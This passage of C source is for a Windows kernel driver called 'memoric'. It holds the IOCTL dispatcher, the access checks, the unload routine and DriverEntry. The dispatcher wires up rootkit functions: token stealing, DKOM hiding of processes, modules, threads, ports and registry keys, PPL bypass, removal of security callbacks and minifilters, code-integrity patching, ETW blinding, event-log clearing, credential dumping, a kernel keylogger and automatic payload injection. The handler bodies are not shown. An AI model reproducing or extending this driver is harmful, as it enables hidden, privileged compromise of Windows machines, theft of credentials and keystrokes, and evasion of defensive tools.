    BOOLEAN isSystem = FALSE;

    SeCaptureSubjectContext(&subjectContext);
    token = SeQuerySubjectContextToken(&subjectContext);
    if (token) {
        isSystem = SeTokenIsAdmin(token);
        /* Additionally check if the caller's user SID is SYSTEM (S-1-5-18).
         * SeTokenIsAdmin only checks for Administrators group membership.
         * For SYSTEM identity check, verify the token user SID. */
        {
            PTOKEN_USER tokenUser = NULL;
            NTSTATUS qs;
            qs = SeQueryInformationToken(token, TokenUser, (PVOID*)&tokenUser);
            if (NT_SUCCESS(qs) && tokenUser) {
                /* SYSTEM SID: S-1-5-18 = {1, 1, {0,0,0,0,0,5}, {18}} */
                SID systemSid;
                SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
                RtlInitializeSid(&systemSid, &ntAuth, 1);
                *RtlSubAuthoritySid(&systemSid, 0) = SECURITY_LOCAL_SYSTEM_RID;
                isSystem = RtlEqualSid(tokenUser->User.Sid, &systemSid);
                ExFreePool(tokenUser);
            }
        }
    }
    SeReleaseSubjectContext(&subjectContext);
    return isSystem;
}

static NTSTATUS CheckIoctlAccess(ULONG ioctl)
{
    ULONG level = ClassifyIoctl(ioctl);

    if (level == IOCTL_ACCESS_READONLY)
        return STATUS_SUCCESS; /* SeDebugPrivilege at open time suffices */

    if (level == IOCTL_ACCESS_DESTRUCT) {
        if (!IsCallerSystem()) {
            DbgPrint("[memoric] Access denied: destructive IOCTL 0x%08X requires SYSTEM token\n", ioctl);
            return STATUS_ACCESS_DENIED;
        }
    }

    /* MODIFY level: SeDebugPrivilege at open time is sufficient (already admin) */
    return STATUS_SUCCESS;
}

/* Internal dispatcher — called within SEH wrapper */
static NTSTATUS MemoricDispatchIoctl(
    ULONG ioctl,
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    NTSTATUS status;

    switch (ioctl) {
    case IOCTL_MEMORIC_PHYS_READ:
        status = HandlePhysRead(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PHYS_WRITE:
        status = HandlePhysWrite(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_VIRT_READ:
        status = HandleVirtRead(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_VIRT_WRITE:
        status = HandleVirtWrite(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_GET_CR3:
        status = HandleGetCr3(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_GET_EPROCESS:
        status = HandleGetEprocess(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_TOKEN_STEAL:
        status = HandleTokenSteal(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_DKOM_HIDE:
        status = HandleDkomHide(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PPL_REMOVE:
        status = HandlePplRemove(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_WRITE_KERNEL:
        status = HandleForceKernelWrite(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_VA_TO_PA:
        status = HandleVaToPa(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_ENUM_PROCESS:
        status = HandleEnumProcess(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_MODULE_HIDE:
        status = HandleModuleHide(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_THREAD_HIDE:
        status = HandleThreadHide(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CALLBACK_ENUM:
        status = HandleCallbackEnum(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CALLBACK_REMOVE:
        status = HandleCallbackRemove(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PATCH_KERNEL:
        status = HandlePatchKernel(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_APC_INJECT:
        status = HandleApcInject(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_HANDLE_STRIP:
        status = HandleHandleStrip(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_REG_PROTECT:
        status = HandleRegProtect(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_NOTIFY_ROUTINE:
        status = HandleNotifyRoutine(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PE_DUMP:
        status = HandlePeDump(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_SET_DEBUG_PORT:
        status = HandleSetDebugPort(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_DPC_TIMER:
        status = HandleDpcTimer(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PORT_HIDE:
        status = HandlePortHide(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_TOKEN_DUP:
        status = HandleTokenDup(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_OBJECT_HOOK:
        status = HandleObjectHook(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_DRIVER_STATS:
        status = HandleDriverStats(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CAPABILITIES:
        status = HandleCapabilities(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_MEMORY_POOL:
        status = HandleMemoryPool(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_MINIFILTER_ENUM:
        status = HandleMinifilterEnum(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PROCESS_DUMP:
        status = HandleProcessDump(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_HYPERVISOR_DETECT:
        status = HandleHypervisorDetect(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_TESTSIGN_HIDE:
        status = HandleTestSignHide(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_GLOBAL_HOOK:
        status = HandleGlobalHook(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_AUTO_INJECT:
        status = HandleAutoInject(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_INFINITY_HOOK:
        status = HandleInfinityHook(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_GET_MODULE_BASE:
        status = HandleGetModuleBase(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CI_CALLBACK_PATCH:
        status = HandleCiCallbackPatch(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CI_FUNC_PATCH:
        status = HandleCiFuncPatch(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PTE_RW:
        status = HandlePteRW(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_MSR_RW:
        status = HandleMsrRW(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_DRIVER_CLOAK:
        status = HandleDriverCloak(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_FORCE_KILL:
        status = HandleForceKill(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_FORCE_DELETE:
        status = HandleForceDelete(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_SYSTEM_THREAD:
        status = HandleSystemThread(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_KERNEL_EXEC:
        status = HandleKernelExec(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PPL_BYPASS:
        status = HandlePplBypass(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CR_RW:
        status = HandleCrRW(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_IDT_RW:
        status = HandleIdtRW(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_UNLOADED_DRV_CLEAR:
        status = HandleUnloadedDrvClear(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_TOKEN_SWAP:
        status = HandleTokenSwap(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_PROCESS_PROTECT:
        status = HandleProcessProtect(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_KEYLOGGER:
        status = HandleKeylogger(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_REG_HIDE:
        status = HandleRegHide(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_FILE_LOCK:
        status = HandleFileLock(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_ETW_BLIND:
        status = HandleEtwBlind(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_EPROCESS_SPOOF:
        status = HandleEprocessSpoof(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_EVENT_LOG_CLEAR:
        status = HandleEventLogClear(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CRED_DUMP:
        status = HandleCredDump(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_DRIVER_IMPERSONATE:
        status = HandleDriverImpersonate(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_CALLBACK_NUKE:
        status = HandleCallbackNuke(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_MINIFILTER_DETACH:
        status = HandleMinifilterDetach(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_KERNEL_APC_INJECT:
        status = HandleKernelApcInject(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    case IOCTL_MEMORIC_WFP_REMOVE:
        status = HandleWfpRemove(systemBuffer, inputLength, outputLength, bytesReturned);
        break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    return status;
}

NTSTATUS MemoricDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp)
{
    PIO_STACK_LOCATION irpSp;
    ULONG ioctl;
    PVOID systemBuffer;
    ULONG inputLength, outputLength;
    ULONG bytesReturned = 0;
    NTSTATUS status;

    UNREFERENCED_PARAMETER(DeviceObject);

    irpSp = IoGetCurrentIrpStackLocation(Irp);
    ioctl = irpSp->Parameters.DeviceIoControl.IoControlCode;
    systemBuffer = Irp->AssociatedIrp.SystemBuffer;
    inputLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    outputLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

    InterlockedIncrement(&g_IoctlTotal);

    if (!systemBuffer) {
        status = STATUS_INVALID_PARAMETER;
        InterlockedIncrement(&g_IoctlFailed);
        goto done;
    }

    /* Reject IOCTLs if driver is unloading */
    if (g_Unloading) {
        status = STATUS_DELETE_PENDING;
        InterlockedIncrement(&g_IoctlFailed);
        goto done;
    }

    InterlockedIncrement(&g_InFlightIoctls);

    /* Per-IOCTL access control check */
    status = CheckIoctlAccess(ioctl);
    if (!NT_SUCCESS(status)) {
        InterlockedDecrement(&g_InFlightIoctls);
        InterlockedIncrement(&g_IoctlFailed);
        goto done;
    }

    /* Global SEH wrapper — catches any unhandled exceptions in handlers */
    __try {
        status = MemoricDispatchIoctl(ioctl, systemBuffer, inputLength,
                                       outputLength, &bytesReturned);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        bytesReturned = 0;
        InterlockedIncrement(&g_IoctlException);
        DbgPrint("[memoric] EXCEPTION in IOCTL 0x%08X: status=0x%08X\n",
                 ioctl, status);
    }

    InterlockedDecrement(&g_InFlightIoctls);

    if (NT_SUCCESS(status))
        InterlockedIncrement(&g_IoctlSuccess);
    else
        InterlockedIncrement(&g_IoctlFailed);

done:
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

/* ================================================================
 * Driver Entry / Unload
 * ================================================================ */

VOID MemoricUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symlink;

    UNREFERENCED_PARAMETER(DriverObject);

    /* Signal that we're unloading - reject new opens */
    InterlockedExchange(&g_Unloading, 1);

    /* Wait for in-flight IOCTLs to drain (max ~5 seconds) */
    {
        ULONG retries = 0;
        LARGE_INTEGER delay;
        delay.QuadPart = -100000; /* 10ms in 100ns units */
        while (g_InFlightIoctls > 0 && retries < 500) {
            KeDelayExecutionThread(KernelMode, FALSE, &delay);
            retries++;
        }
        if (g_InFlightIoctls > 0)
            DbgPrint("[memoric] WARNING: %ld IOCTLs still in flight at unload\n", g_InFlightIoctls);
    }

    /* Cancel all DPC timers */
    if (g_DpcTimersInitialized) {
        ULONG i;
        for (i = 0; i < MAX_DPC_TIMERS; i++) {
            if (g_DpcTimers[i].Active) {
                KeCancelTimer(&g_DpcTimers[i].Timer);
                g_DpcTimers[i].Active = FALSE;
            }
        }
    }

    /* Phase 13 cleanup: Cancel keylogger timer + DPC */
    if (g_KeyloggerActive) {
        InterlockedExchange(&g_KeyloggerActive, 0);
        KeCancelTimer(&g_KeyloggerTimer);
        KeFlushQueuedDpcs(); /* Wait for any in-flight DPC to complete */
        DbgPrint("[memoric] Keylogger timer cancelled\n");
    }

    /* Phase 13 cleanup: Unregister registry hide callback */
    if (g_RegHideCallbackRegistered) {
        CmUnRegisterCallback(g_RegHideCookie);
        g_RegHideCallbackRegistered = FALSE;
        DbgPrint("[memoric] RegHide callback unregistered\n");
    }

    /* Phase 13 cleanup: Clear file lock entries + NTFS IRP hooks */
    FileLockRemoveHooks();
    {
        LONG i;
        for (i = 0; i < MAX_FILE_LOCK_ENTRIES; i++)
            g_FileLockEntries[i].InUse = FALSE;
        InterlockedExchange(&g_FileLockCount, 0);
    }

    /* Phase 13 cleanup: Free driver impersonate backup */
    if (g_OrigDriverBackup) {
        ExFreePoolWithTag(g_OrigDriverBackup, MEMORIC_POOL_TAG);
        g_OrigDriverBackup = NULL;
        g_OrigDriverBackupSize = 0;
    }

    /* Restore InfinityHook if active */
    if (g_InfinityHookEnabled && g_GetCpuClockAddr != 0 && g_OrigGetCpuClock != 0) {
        SafeKernelWrite((PVOID)g_GetCpuClockAddr, &g_OrigGetCpuClock, sizeof(ULONG64));
        g_InfinityHookEnabled = 0;
        DbgPrint("[memoric] InfinityHook restored during unload\n");
    }

    /* Restore all active GlobalHooks */
    {
        ULONG i;
        for (i = 0; i < MEMORIC_MAX_GLOBAL_HOOKS; i++) {
            if (g_GlobalHooks[i].Active) {
                PUCHAR target = (PUCHAR)g_GlobalHooks[i].OriginalAddress;
                SafeKernelWrite(target, g_GlobalHooks[i].OriginalBytes, 16);
                g_GlobalHooks[i].Active = 0;
            }
        }
        g_GlobalHookCount = 0;
        DbgPrint("[memoric] GlobalHooks restored during unload\n");
    }

    /* Unregister AutoInject callbacks and free payload */
    if (g_AutoInjectCallbackRegistered) {
        PsSetCreateProcessNotifyRoutineEx(AutoInjectCreateProcessNotify, TRUE);
        g_AutoInjectCallbackRegistered = FALSE;
    }
    if (g_AutoInjectThreadCallbackRegistered) {
        PsRemoveCreateThreadNotifyRoutine(AutoInjectThreadNotify);
        g_AutoInjectThreadCallbackRegistered = FALSE;
    }
    if (g_AutoInjectPayload) {
        ExFreePoolWithTag(g_AutoInjectPayload, MEMORIC_POOL_TAG);
        g_AutoInjectPayload = NULL;
        g_AutoInjectPayloadSize = 0;
    }
    g_AutoInjectEnabled = 0;

    /* Unregister object callbacks */
    if (g_ObCallbackRegistration) {
        ObUnRegisterCallbacks(g_ObCallbackRegistration);
        g_ObCallbackRegistration = NULL;
    }

    /* Unregister notification callbacks */
    if (g_NotifyProcessRegistered) {
        PsSetCreateProcessNotifyRoutineEx(ProcessNotifyRoutine, TRUE);
        g_NotifyProcessRegistered = FALSE;
    }
    if (g_NotifyThreadRegistered) {
        PsRemoveCreateThreadNotifyRoutine(ThreadNotifyRoutine);
        g_NotifyThreadRegistered = FALSE;
    }
    if (g_NotifyImageRegistered) {
        PsRemoveLoadImageNotifyRoutine(ImageNotifyRoutine);
        g_NotifyImageRegistered = FALSE;
    }

    /* Unregister registry callback */
    if (g_RegCallbackRegistered) {
        CmUnRegisterCallback(g_RegCallbackCookie);
        g_RegCallbackRegistered = FALSE;
    }

    /* Delete symlink first to prevent new usermode opens */
    RtlInitUnicodeString(&symlink, MEMORIC_SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlink);

    /* Delete device object (will complete when last handle closes) */
    if (g_DeviceObject) {
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
    }

    DbgPrint("[memoric] Driver unloaded (handles still open: %ld)\n", g_OpenHandles);
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath)
{
    UNICODE_STRING deviceName, symlinkName;
    NTSTATUS status;

    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[memoric] DriverEntry - loading memoric kernel driver\n");

    /* Resolve EPROCESS offsets first */
    status = ResolveEprocessOffsets();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[memoric] WARNING: Offset resolution failed (0x%08X), "
                 "some operations may be unavailable\n", status);
        /* Continue anyway - physical R/W and virtual R/W still work */
    }

    /* Create device object */
    RtlInitUnicodeString(&deviceName, MEMORIC_DEVICE_NAME);
    status = IoCreateDevice(
        DriverObject,
        0,                      /* DeviceExtensionSize */
        &deviceName,
        MEMORIC_DEVICE_TYPE,
        0,                      /* DeviceCharacteristics */
        FALSE,                  /* Exclusive */
        &g_DeviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[memoric] IoCreateDevice failed: 0x%08X\n", status);
        return status;
    }

    /* Create symbolic link for usermode access */
    RtlInitUnicodeString(&symlinkName, MEMORIC_SYMLINK_NAME);
    status = IoCreateSymbolicLink(&symlinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[memoric] IoCreateSymbolicLink failed: 0x%08X\n", status);
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
        return status;
    }

    /* Apply restrictive DACL: only SYSTEM (S-1-5-18) and
       Builtin Administrators (S-1-5-32-544) get full access.
       This prevents non-admin processes from opening \\.\Memoric. */
    {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PACL dacl = NULL;
        ULONG daclSize;
        SECURITY_DESCRIPTOR sd;

        /* Build SYSTEM SID (S-1-5-18) manually on stack */
        UCHAR systemSidBuf[SECURITY_MAX_SID_SIZE];
        PSID systemSid = (PSID)systemSidBuf;
        ULONG sidLen = RtlLengthRequiredSid(1);
        RtlInitializeSid(systemSid, &ntAuth, 1);
        *RtlSubAuthoritySid(systemSid, 0) = SECURITY_LOCAL_SYSTEM_RID;

        /* Build Admin SID (S-1-5-32-544) manually on stack */
        UCHAR adminSidBuf[SECURITY_MAX_SID_SIZE];
        PSID adminSid = (PSID)adminSidBuf;
        sidLen = RtlLengthRequiredSid(2);
        RtlInitializeSid(adminSid, &ntAuth, 2);
        *RtlSubAuthoritySid(adminSid, 0) = SECURITY_BUILTIN_DOMAIN_RID;
        *RtlSubAuthoritySid(adminSid, 1) = DOMAIN_ALIAS_RID_ADMINS;

        daclSize = (ULONG)(sizeof(ACL) +
            2 * (ULONG)(FIELD_OFFSET(ACCESS_ALLOWED_ACE, SidStart)) +
            RtlLengthSid(systemSid) + RtlLengthSid(adminSid));
        dacl = (PACL)ExAllocatePool2(POOL_FLAG_NON_PAGED, daclSize, MEMORIC_POOL_TAG);
        if (dacl) {
            RtlCreateAcl(dacl, daclSize, ACL_REVISION);
            RtlAddAccessAllowedAce(dacl, ACL_REVISION, GENERIC_ALL, systemSid);
            RtlAddAccessAllowedAce(dacl, ACL_REVISION, GENERIC_ALL, adminSid);
            RtlCreateSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
            RtlSetDaclSecurityDescriptor(&sd, TRUE, dacl, FALSE);
            ObSetSecurityObjectByPointer(g_DeviceObject, DACL_SECURITY_INFORMATION, &sd);
            ExFreePoolWithTag(dacl, MEMORIC_POOL_TAG);
            DbgPrint("[memoric] Device DACL set: SYSTEM + Administrators only\n");
        }
    }

    /* Set dispatch routines */
    DriverObject->MajorFunction[IRP_MJ_CREATE] = MemoricCreate;
    DriverObject->MajorFunction[IRP_MJ_CLEANUP] = MemoricCleanup;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = MemoricClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MemoricDeviceControl;
    DriverObject->DriverUnload = MemoricUnload;

    /* We use METHOD_BUFFERED IOCTLs only, no DO_DIRECT_IO needed */
    g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[memoric] Driver loaded successfully. Device: %wZ\n", &deviceName);
    return STATUS_SUCCESS;
}
